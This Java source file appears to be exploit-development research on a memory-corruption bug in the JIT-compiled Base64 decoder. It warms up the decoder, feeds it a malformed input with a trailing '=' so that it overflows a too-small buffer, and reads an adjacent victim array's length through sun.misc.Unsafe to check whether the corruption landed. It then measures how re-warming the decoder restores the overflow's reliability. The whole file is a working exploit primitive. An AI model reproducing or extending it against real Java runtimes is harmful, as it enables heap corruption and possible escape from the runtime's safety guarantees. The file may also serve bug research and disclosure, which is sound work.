import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Hypothesis: a trigger deoptimizes the Base64 intrinsic, so the overflow is
 * effectively one-shot until the method is recompiled.
 *
 * Phase 1: fire repeatedly with NO re-warm, print whether each attempt lands.
 * Phase 2: re-warm between attempts, print whether re-warming restores it.
 *
 * Lengths are read through Unsafe (C2 folds arr.length).
 */
public final class OneShotTheory {
    private static volatile int sink;
    private static sun.misc.Unsafe u;

    static int len(byte[] b) { return u.getInt(b, 12); }

    static boolean fire(Base64.Decoder d, byte[] bad, byte[] dst, byte[] vic) {
        Arrays.fill(vic, (byte) 0x5a);
        try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
        return len(vic) != 64;
    }

    public static void main(String[] a) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];

        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        System.out.println("=== phase 1: repeated trigger, no re-warm ===");
        int landed1 = 0;
        for (int k = 0; k < 20; k++) {
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            boolean hit = fire(d, bad, dst, vic);
            if (hit) landed1++;
            System.out.printf("  attempt %2d landed=%s len=0x%08x%n", k, hit, len(vic));
        }
        System.out.println("  phase1 landed " + landed1 + "/20");

        System.out.println("=== phase 2: re-warm 50k before each trigger ===");
        int landed2 = 0;
        for (int k = 0; k < 8; k++) {
            for (int i = 0; i < 50_000; i++) sink += d.decode(valid, warm);
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            boolean hit = fire(d, bad, dst, vic);
            if (hit) landed2++;
            System.out.printf("  attempt %2d landed=%s len=0x%08x%n", k, hit, len(vic));
        }
        System.out.println("  phase2 landed " + landed2 + "/8");

        System.out.println("=== phase 3: how many valid decodes restore it? ===");
        // burn the intrinsic
        for (int k = 0; k < 5; k++) { byte[] x = new byte[65], y = new byte[64]; fire(d, bad, x, y); }
        for (int need : new int[] { 0, 100, 1000, 5000, 20000 }) {
            for (int i = 0; i < need; i++) sink += d.decode(valid, warm);
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            boolean hit = fire(d, bad, dst, vic);
            System.out.printf("  after %5d valid decodes: landed=%s len=0x%08x%n",
                    need, hit, len(vic));
            if (!hit) {
                // keep trying at increasing counts from here
                for (int extra : new int[] { 5000, 20000, 50000 }) {
                    for (int i = 0; i < extra; i++) sink += d.decode(valid, warm);
                    byte[] d2 = new byte[65];
                    byte[] v2 = new byte[64];
                    boolean h2 = fire(d, bad, d2, v2);
                    System.out.printf("    +%5d -> landed=%s len=0x%08x%n", extra, h2, len(v2));
                    if (h2) break;
                }
            }
        }
    }
}
